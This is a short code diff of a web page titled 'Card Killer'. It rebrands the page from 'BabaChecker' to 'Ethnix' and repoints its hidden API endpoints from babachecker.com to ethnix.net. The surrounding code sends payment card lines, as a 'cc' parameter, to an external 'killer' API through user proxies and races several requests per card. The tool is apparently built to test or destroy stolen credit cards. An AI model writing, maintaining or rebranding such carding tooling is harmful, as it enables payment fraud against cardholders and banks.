@@ -32,7 +32,7 @@ $proxySet = !empty($userProxies);
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>Card Killer • BabaChecker</title>
+<title>Card Killer • Ethnix</title>
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -259,9 +259,9 @@ const $ = s => document.querySelector(s);
 const toast = (t, icon='info') => Swal.fire({toast: true, position: 'top-end', timer: 2400, showConfirmButton: false, icon, title: t, background: 'rgba(2,6,23,.95)', color: '#fff', iconColor: '#34d399'});
 /* API registry (endpoint hidden from UI) */
 const API_OPTIONS = [
-  { id: 'api1', label: 'Test API v1', endpoint: 'https://babachecker.com/api/killer/api.php', alive: true }, // Updated to absolute URL
-  { id: 'api2', label: 'Test API v2', endpoint: 'https://babachecker.com/api/killer/api2.php', alive: false },
-  { id: 'api3', label: 'Test API v3', endpoint: 'https://babachecker.com/api/killer/api3.php', alive: false },
+  { id: 'api1', label: 'Test API v1', endpoint: 'https://ethnix.net/api/killer/api.php', alive: true }, // Updated to absolute URL
+  { id: 'api2', label: 'Test API v2', endpoint: 'https://ethnix.net/api/killer/api2.php', alive: false },
+  { id: 'api3', label: 'Test API v3', endpoint: 'https://ethnix.net/api/killer/api3.php', alive: false },
 
 ];
 const LS_CFG_KEY = 'cx_killer_cfg_v1';
@@ -348,7 +348,7 @@ async function raceFive(ccLine, onBump) {
   }, $userProxies)); ?>;
 
   function buildUrl(index) {
-    const base = SELECTED_API?.endpoint || 'https://babachecker.com/api/killer/api.php'; // Fallback to absolute URL
+    const base = SELECTED_API?.endpoint || 'https://ethnix.net/api/killer/api.php'; // Fallback to absolute URL
 
     const u = new URL(base, window.location.origin);
     u.searchParams.set('cc', ccLine);
